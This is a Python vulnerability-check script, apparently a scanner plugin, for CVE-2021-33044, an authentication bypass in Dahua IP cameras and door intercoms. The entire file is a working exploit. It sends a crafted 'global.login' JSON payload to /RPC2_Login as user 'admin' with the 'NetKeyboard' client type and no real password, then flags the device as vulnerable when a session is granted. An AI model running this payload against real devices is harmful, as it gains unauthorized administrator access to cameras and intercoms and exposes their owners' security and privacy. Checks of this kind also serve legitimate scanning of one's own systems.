import requests
import urllib, re

def verify(url):
    result = {
        'name': ' Dahua IPC/VTH/VTO devices Authentication Bypas(CVE-2021-33044)',
        'vulnerable': False,
        'attack': False,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/RPC2_Login')
    payload_data = '{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}'
    try:
        rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        if rep.status_code == 200 and re.search('\{"id":1,"params":\{"keepAliveInterval":60\},"result":true,"session":".+"\}', rep.text):
            result['vulnerable'] = True
            result['vurl'] = vurl
        return result
    except:
        return result